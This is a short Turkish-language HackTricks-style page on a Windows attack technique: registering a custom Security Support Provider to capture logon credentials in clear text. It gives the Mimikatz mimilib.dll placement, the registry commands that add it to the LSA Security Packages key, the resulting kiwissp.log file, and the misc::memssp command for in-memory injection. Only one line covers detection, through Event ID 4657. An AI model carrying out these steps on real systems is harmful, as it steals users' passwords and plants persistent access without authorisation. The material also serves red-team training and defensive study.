# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **credentials** bilgilerini **clear text** olarak **capture** etmek üzere **kendi SSP'nizi** oluşturabilirsiniz.

#### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` binary dosyasını kullanabilirsiniz. **Bu, tüm credentials bilgilerini clear text olarak bir dosyaya kaydeder.**\
DLL'yi `C:\Windows\System32\` konumuna bırakın.\
Mevcut LSA Security Packages listesini alın:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll` dosyasını Security Support Provider listesine (Security Packages) ekleyin:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve yeniden başlatmanın ardından tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` içinde açık metin olarak bulunabilir.

#### Bellekte

Bunu Mimikatz kullanarak doğrudan belleğe de enjekte edebilirsiniz (biraz kararsız olabileceğini/çalışmayabileceğini unutmayın):
```bash
privilege::debug
misc::memssp
```
Bu, yeniden başlatmalardan sonra kalıcı olmaz.

#### Önlem

Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturulmasını/değiştirilmesini denetle

{{#include ../../banners/hacktricks-training.md}}
